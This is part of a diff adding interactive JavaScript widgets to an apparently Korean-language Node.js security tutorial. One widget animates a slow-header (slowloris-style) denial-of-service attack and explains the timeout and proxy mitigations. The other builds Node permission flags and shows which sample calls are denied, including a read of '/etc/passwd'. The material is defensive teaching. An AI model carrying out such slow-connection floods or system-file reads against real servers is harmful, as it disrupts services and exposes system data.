+        { cap: `정상 트래픽: 커넥션 ${N}개 중 일부가 요청을 처리하고 금방 반환된다.`, f: () => set(Array.from({ length: N }, (_, i) => i < 6 ? ["ok", "200"] : ["free", "-"])) },
+        { cap: "공격자가 수백 개의 커넥션을 열고 각각 헤더를 1바이트씩, 수십 초 간격으로 보낸다. 요청이 '완료'되지 않으므로 핸들러는 호출조차 되지 않는다.", f: () => set(Array.from({ length: N }, (_, i) => i < 18 ? ["slow", "hdr…"] : i < 22 ? ["ok", "200"] : ["free", "-"])) },
+        { cap: `${ht}초가 지나기 전: 커넥션 상한에 도달. 정상 사용자의 새 연결은 큐에서 기다리거나 거부된다. CPU·메모리는 한가하다 — 메트릭으로는 '장애'가 아니다.`, f: () => set(Array.from({ length: N }, () => ["slow", "hdr…"])) },
+        { cap: ht >= 60 ? `headersTimeout=60초: 공격자는 59초마다 1바이트만 보내면 커넥션을 영원히 유지할 수 있다. 서비스 거부가 지속된다.` : `headersTimeout=${ht}초: ${ht}초 안에 헤더가 완성되지 않은 커넥션은 408 후 종료된다. 공격자가 재연결해도 매 ${ht}초마다 슬롯이 돌아온다.`, f: () => set(Array.from({ length: N }, (_, i) => ht >= 60 ? ["slow", "hdr…"] : i % 3 === 0 ? ["free", "408"] : ["slow", "hdr…"])) },
+        { cap: ht >= 60 ? "해결: headersTimeout을 10~30초로 낮추고, 프록시에서 client_header_timeout·동시 연결 제한, 가능하면 WAF." : "정상 사용자가 반환된 슬롯을 쓸 수 있다. 완전한 해결은 프록시/WAF의 연결 제한과 함께.", f: () => set(Array.from({ length: N }, (_, i) => ht >= 60 ? (i < 20 ? ["slow", "hdr…"] : ["ok", "wait"]) : i % 3 === 0 ? ["ok", "200"] : ["slow", "hdr…"])) },
+      ];
+      $("sl-step").innerHTML = "";
+      MM.stepper($("sl-step"), { steps: steps.length, interval: 1800, render(i) { steps[i].f(); return steps[i].cap; } });
+    }
+    $("sl-ht").onchange = run; run();
+  })();
+
+  // ===== 위젯 4: 권한 플래그 빌더 =====
+  (function () {
+    const ids = ["pm-fsr", "pm-fsw", "pm-child", "pm-worker", "pm-addons", "pm-net", "pm-audit", "pm-fsr-p", "pm-fsw-p"];
+    function build() {
+      const on = id => $(id).checked;
+      const paths = id => $(id).value.split(",").map(s => s.trim()).filter(Boolean);
+      const flags = [on("pm-audit") ? "--permission-audit" : "--permission"];
+      if (on("pm-fsr")) paths("pm-fsr-p").forEach(p => flags.push(`--allow-fs-read=${p}`));
+      if (on("pm-fsw")) paths("pm-fsw-p").forEach(p => flags.push(`--allow-fs-write=${p}`));
+      if (on("pm-child")) flags.push("--allow-child-process");
+      if (on("pm-worker")) flags.push("--allow-worker");
+      if (on("pm-addons")) flags.push("--allow-addons");
+      if (on("pm-net")) flags.push("--allow-net");
+      $("pm-cmd").textContent = "node " + flags.join(" \\\n     ") + " \\\n     server.js";
+      const rows = [];
+      const fsr = on("pm-fsr") ? paths("pm-fsr-p") : [];
+      const inside = (p, list) => list.some(d => p === d || p.startsWith(d.replace(/\/$/, "") + "/"));
+      const chk = (desc, allowed, note) => rows.push(`<div><span class="${allowed ? "a" : "d"}">${allowed ? "허용" : "거부"}</span>  ${MM.esc(desc)}${note ? `  <span class="muted">${note}</span>` : ""}</div>`);
+      chk("fs.readFileSync('/app/config.json')", inside("/app/config.json", fsr));
+      chk("fs.readFileSync('/etc/passwd')", inside("/etc/passwd", fsr));
+      chk("fs.readFileSync('/etc/ssl/certs/ca.pem')", inside("/etc/ssl/certs/ca.pem", fsr), "TLS 사설 CA 를 쓰면 필요");
+      chk("fs.writeFileSync('/tmp/app/cache.bin')", on("pm-fsw") && inside("/tmp/app/cache.bin", paths("pm-fsw-p")));
+      chk("fs.writeFileSync('/app/log.txt')", on("pm-fsw") && inside("/app/log.txt", paths("pm-fsw-p")));
+      chk("child_process.execFile('convert', [...])", on("pm-child"), "ERR_ACCESS_DENIED permission: ChildProcess");
+      chk("new Worker('./job.js')", on("pm-worker"), "ERR_ACCESS_DENIED permission: WorkerThreads");
+      chk("require('./build/Release/addon.node')", on("pm-addons"), "ERR_ACCESS_DENIED permission: Addons — 허용 시 모든 제한 우회 가능");
+      chk("fetch('https://api.example.com')", on("pm-net"), "--allow-net 이 있는 버전에서만 검사됨; 구버전은 네트워크를 제한하지 않음");
+      if (on("pm-audit")) rows.push(`<div class="muted">감사 모드: 위 '거부' 항목은 실제로는 허용되고 stderr 에 기록만 된다. 필요한 권한 목록을 뽑은 뒤 --permission 으로 전환.</div>`);
+      $("pm-deny").innerHTML = rows.join("");
+    }
+    ids.forEach(id => { $(id).oninput = build; $(id).onchange = build; });
+    build();
+  })();
+})();
+</script>
+</body>
+</html>
